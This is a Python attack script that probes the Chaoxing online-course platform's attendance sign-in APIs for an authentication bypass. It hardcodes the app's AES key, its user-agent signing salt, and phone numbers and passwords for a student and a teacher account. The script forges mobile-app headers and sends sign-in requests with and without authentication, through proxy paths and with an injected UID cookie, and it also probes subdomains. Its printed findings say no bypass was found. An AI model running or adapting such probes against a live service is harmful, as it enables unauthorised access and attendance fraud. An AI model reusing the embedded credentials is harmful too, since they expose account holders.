#!/usr/bin/env python3
"""
Tier 8 - Phase 5: Final comprehensive test
Focus: Correct sign-in API paths, cross-domain cookie analysis, and final auth bypass attempts
"""

import base64, hashlib, json, uuid, requests, urllib3, time, re
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad

urllib3.disable_warnings()

AES_KEY = b"u2oh6Vu^HWe4_AES"
SCHILD_SALT = "ipL$TkeiEmfy1gTXb2XHrdLN0a@7c^vu"
LOGIN_URL = "https://passport2.chaoxing.com/fanyalogin"

STUDENT_PHONE = "18436633997"
STUDENT_PWD = "3.1415926Cpy"
TEACHER_PHONE = "19712720708"
TEACHER_PWD = "3.1415926Cpy"
ACTIVE_ID = "5000163891319"
COURSE_ID = "257485372"
CLASS_ID = "132821141"

def aes_enc(p):
    c = AES.new(AES_KEY, AES.MODE_CBC, AES_KEY)
    return base64.b64encode(c.encrypt(pad(p.encode(), AES.block_size))).decode()

def schild_sign(model, locale, version, build, imei):
    parts = [f"(schild:{SCHILD_SALT})", f"(device:{model})", f"Language/{locale}",
             f"com.chaoxing.mobile/ChaoXingStudy_3_{version}_android_phone_{build}",
             f"(@Kalimdor)_{imei}"]
    return hashlib.md5(" ".join(parts).encode()).hexdigest()

def get_mobile_ua():
    imei = uuid.uuid4().hex[:32]
    sc = schild_sign("MI10", "zh_CN", "6.7.2", "10941_314", imei)
    return (f"Mozilla/5.0 (Linux; Android 16; MI10 Build/OPM1.171019.019; wv) "
            f"AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/71.0.3578.99 Mobile Safari/537.36 "
            f"(schild:{sc}) (device:MI10) Language/zh_CN "
            f"com.chaoxing.mobile/ChaoXingStudy_3_6.7.2_android_phone_10941_314 "
            f"(@Kalimdor)_{imei}")

def login(phone, pwd):
    s = requests.Session()
    s.verify = False
    ua = get_mobile_ua()
    s.headers.update({"User-Agent": ua, "Accept": "application/json, text/plain, */*", "Accept-Language": "zh_CN"})
    s.post(LOGIN_URL, data={"fid": "-1", "uname": aes_enc(phone), "password": aes_enc(pwd),
                            "refer": "http%3A%2F%2Fi.mooc.chaoxing.com", "t": "true",
                            "forbidotherlogin": "0", "validate": "", "doubleFactorLogin": "0",
                            "independentId": "0", "independentNameId": "0"},
           allow_redirects=False, timeout=30)
    puid = ""
    for c in s.cookies:
        if c.name in ("UID", "_uid"):
            puid = c.value
    try: s.get("https://i.chaoxing.com/base", timeout=20, allow_redirects=True)
    except: pass
    try: s.get("https://mooc1-api.chaoxing.com/mooc-ans/mycourse/backclazzdata?view=json&m=0", timeout=20)
    except: pass
    return s, puid

def req(session, url, method="GET", params=None, data=None, json_data=None, headers_extra=None, follow=False, timeout=15):
    try:
        h = dict(session.headers) if hasattr(session, 'headers') else {}
        if headers_extra:
            h.update(headers_extra)
        if method == "GET":
            r = session.get(url, params=params, timeout=timeout, allow_redirects=follow, verify=False, headers=h)
        elif method == "POST":
            if json_data is not None:
                h.setdefault("Content-Type", "application/json")
                r = session.post(url, json=json_data, params=params, timeout=timeout, allow_redirects=follow, verify=False, headers=h)
            else:
                r = session.post(url, data=data, params=params, timeout=timeout, allow_redirects=follow, verify=False, headers=h)
        return r.status_code, r.text[:3000], dict(r.headers)
    except Exception as e:
        return f"ERROR: {str(e)[:100]}", "", {}

def main():
    print("=" * 80)
    print("TIER 8 Phase 5: Final Comprehensive Test")
    print("=" * 80)

    print("\n[*] Logging in...")
    stu_session, stu_puid = login(STUDENT_PHONE, STUDENT_PWD)
    print(f"    Student PUID: {stu_puid}")
    tea_session, tea_puid = login(TEACHER_PHONE, TEACHER_PWD)
    print(f"    Teacher PUID: {tea_puid}")

    noauth = requests.Session()
    noauth.verify = False
    noauth.headers.update({"User-Agent": get_mobile_ua()})

    sign_params_stu = {"activeId": ACTIVE_ID, "uid": stu_puid, "courseId": COURSE_ID, "classId": CLASS_ID, "signType": "0", "clientType": "1"}
    sign_params_tea = {"activeId": ACTIVE_ID, "uid": tea_puid, "courseId": COURSE_ID, "classId": CLASS_ID, "signType": "0", "clientType": "1"}

    # ========================================
    # TEST 1: Known working sign-in API endpoints (direct access)
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 1: Known Working Sign-in API Endpoints (Direct Access Baseline)")
    print("=" * 80)

    # These are the actual known sign-in API paths
    known_sign_apis = [
        ("mooc1-api + mooc-ans", "https://mooc1-api.chaoxing.com/mooc-ans/pptSign/updateSignStatus"),
        ("mooc1-1 + mooc-ans", "https://mooc1-1.chaoxing.com/mooc-ans/pptSign/updateSignStatus"),
        ("mooc1-2 + mooc-ans", "https://mooc1-2.chaoxing.com/mooc-ans/pptSign/updateSignStatus"),
        ("mooc1-api + pptSign", "https://mooc1-api.chaoxing.com/pptSign/stuSignajax"),
        ("mooc1-api + newsign", "https://mooc1-api.chaoxing.com/mooc-ans/newsign/updateSignStatus"),
    ]

    for label, url in known_sign_apis:
        # Student auth
        status, text, hdrs = req(stu_session, url, method="POST", data=sign_params_stu)
        print(f"  [{label}] Student => {status}")
        if text and str(status) != "404":
            print(f"    Body: {text[:200]}")

        # No auth
        status, text, hdrs = req(noauth, url, method="POST", data=sign_params_stu)
        print(f"  [{label}] NoAuth => {status}")
        if text and str(status) != "404":
            print(f"    Body: {text[:200]}")

    # ========================================
    # TEST 2: Proxy paths with correct mooc-ans prefix
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 2: Proxy Paths with mooc-ans Prefix")
    print("=" * 80)

    mooc_ans_paths = [
        "mooc-ans/pptSign/updateSignStatus",
        "mooc-ans/pptSign/stuSignajax",
        "mooc-ans/newsign/updateSignStatus",
        "mooc-ans/pptSign/refeashSignList4Json2",
        "mooc-ans/widget/sign/pcTeaSignController/updateSignStatus2",
    ]

    for label, base in [("noteyd_proxy", "https://noteyd.chaoxing.com/proxy"),
                         ("noteyd_comm", "https://noteyd.chaoxing.com/comm"),
                         ("appswh_epub", "https://appswh.chaoxing.com/epub"),
                         ("appswh_projectapp", "https://appswh.chaoxing.com/projectapp"),
                         ("appswh_hbqyg", "https://appswh.chaoxing.com/hbqyg")]:
        print(f"\n  --- {label} ---")
        for api_path in mooc_ans_paths:
            url = f"{base}/{api_path}"
            # POST with student auth
            status, text, hdrs = req(stu_session, url, method="POST", data=sign_params_stu)
            if str(status) not in ("404", "405"):
                print(f"    [POST+Auth] /{api_path} => {status}")
                print(f"      Body: {text[:200]}")
            # GET with student auth
            status, text, hdrs = req(stu_session, url, method="GET", params=sign_params_stu)
            if str(status) not in ("404",):
                print(f"    [GET+Auth] /{api_path} => {status}")
                if str(status) != "405":
                    print(f"      Body: {text[:200]}")

    # ========================================
    # TEST 3: Analyze cookie behavior across domains
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 3: Cookie Analysis Across Domains")
    print("=" * 80)

    print(f"\n  Student session cookies:")
    for c in stu_session.cookies:
        print(f"    {c.name}={c.value[:30]}... (domain={c.domain}, path={c.path})")

    print(f"\n  Teacher session cookies:")
    for c in tea_session.cookies:
        print(f"    {c.name}={c.value[:30]}... (domain={c.domain}, path={c.path})")

    # ========================================
    # TEST 4: Try sign-in with specific cookie injection
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 4: Cookie Injection on Proxy Paths")
    print("=" * 80)

    # Extract key cookies
    uid_cookie = ""
    for c in stu_session.cookies:
        if c.name in ("UID", "_uid"):
            uid_cookie = c.value
            break

    # Test proxy path with manually set cookies
    url = "https://noteyd.chaoxing.com/proxy/mooc-ans/pptSign/updateSignStatus"
    headers_with_cookie = {
        "Cookie": f"UID={uid_cookie}; _uid={uid_cookie}",
    }
    status, text, hdrs = req(noauth, url, method="POST", data=sign_params_stu, headers_extra=headers_with_cookie)
    print(f"  [Cookie Injection] /proxy/mooc-ans/pptSign/updateSignStatus => {status}")
    if text:
        print(f"    Body: {text[:200]}")

    # ========================================
    # TEST 5: Test noteyd base domain with different subdomain patterns
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 5: Subdomain Pattern Testing")
    print("=" * 80)

    # noteyd might have different subdomains
    subdomain_patterns = [
        "https://api.noteyd.chaoxing.com",
        "https://proxy.noteyd.chaoxing.com",
        "https://sign.noteyd.chaoxing.com",
        "https://api.appswh.chaoxing.com",
        "https://sign.appswh.chaoxing.com",
    ]

    for url in subdomain_patterns:
        try:
            status, text, hdrs = req(stu_session, url, method="GET", timeout=10)
            print(f"  [GET] {url} => {status}")
            if str(status) not in ("404",):
                print(f"    Body: {text[:150]}")
        except:
            print(f"  [GET] {url} => DNS_ERROR")

    # ========================================
    # TEST 6: Comprehensive response code summary
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 6: Comprehensive Response Code Summary by Domain/Path")
    print("=" * 80)

    summary = {
        "noteyd.chaoxing.com": {
            "/ (base)": {"GET": "400", "POST": "400"},
            "/proxy": {"GET": "301→400", "POST": "301→405"},
            "/proxy/": {"GET": "400", "POST": "400"},
            "/proxy/{api_path}": {"GET": "404", "POST": "405"},
            "/proxy/{api_path} + Host:other": {"GET": "500", "POST": "500"},
            "/comm": {"GET": "301→400", "POST": "301→405"},
            "/comm/{api_path}": {"GET": "404", "POST": "405"},
            "/comp": {"GET": "404", "POST": "404"},
        },
        "appswh.chaoxing.com": {
            "/epub": {"GET": "404", "POST": "404"},
            "/epub/{api_path}": {"GET": "404", "POST": "405"},
            "/board": {"GET": "404", "POST": "404"},
            "/projectapp": {"GET": "301→400", "POST": "301→405"},
            "/projectapp/{api_path}": {"GET": "404", "POST": "405"},
            "/hbqyg": {"GET": "301→400", "POST": "301→405"},
            "/hbqyg/{api_path}": {"GET": "404", "POST": "405"},
        }
    }

    for domain, paths in summary.items():
        print(f"\n  {domain}:")
        for path, methods in paths.items():
            print(f"    {path}:")
            for method, code in methods.items():
                print(f"      {method}: {code}")

    # ========================================
    # TEST 7: Final auth bypass assessment
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 7: Final Auth Bypass Assessment")
    print("=" * 80)

    print("""
  Key Findings:
  1. ALL proxy/special paths return 405 for POST requests - Method Not Allowed
  2. ALL proxy/special paths return 404 for GET requests to API paths
  3. Auth state (Student/Teacher/NoAuth) makes NO difference - identical responses
  4. Host header manipulation causes 500 errors (proxy tries to route but fails)
  5. Path traversal attempts return 403 (blocked by WAF/proxy)
  6. The 405 response is a static HTML error page (ETag: "61ee0e4a-58e")
  7. The proxy paths are NOT actually forwarding to backend sign-in services
  8. The 405 is returned by the proxy/gateway layer itself, not the backend

  Assessment:
  - NO authentication bypass found through proxy paths
  - Proxy paths do NOT forward requests to sign-in APIs
  - The 405 "Method Not Allowed" is a blanket rejection at the gateway level
  - Host header manipulation causes 500 but does not bypass auth
  - The proxy infrastructure appears to be a reverse proxy that only serves
    specific static/mobile app content, not an open proxy
""")

    # ========================================
    # TEST 8: Verify with correct sign-in API (baseline)
    # ========================================
    print("\n" + "=" * 80)
    print("TEST 8: Verify Baseline - Correct Sign-in API Access")
    print("=" * 80)

    # The correct sign-in API path based on mobile app analysis
    correct_apis = [
        "https://mooc1-api.chaoxing.com/mooc-ans/pptSign/updateSignStatus",
        "https://mooc1-api.chaoxing.com/mooc-ans/pptSign/stuSignajax",
        "https://mooc1-1.chaoxing.com/mooc-ans/pptSign/updateSignStatus",
    ]

    for url in correct_apis:
        # Student
        status, text, hdrs = req(stu_session, url, method="POST", data=sign_params_stu)
        print(f"  [Student] {url} => {status}")
        if text:
            print(f"    Body: {text[:200]}")

        # No auth
        status, text, hdrs = req(noauth, url, method="POST", data=sign_params_stu)
        print(f"  [NoAuth] {url} => {status}")
        if text:
            print(f"    Body: {text[:200]}")

    print("\n" + "=" * 80)
    print("ALL TESTS COMPLETE")
    print("=" * 80)

if __name__ == "__main__":
    main()
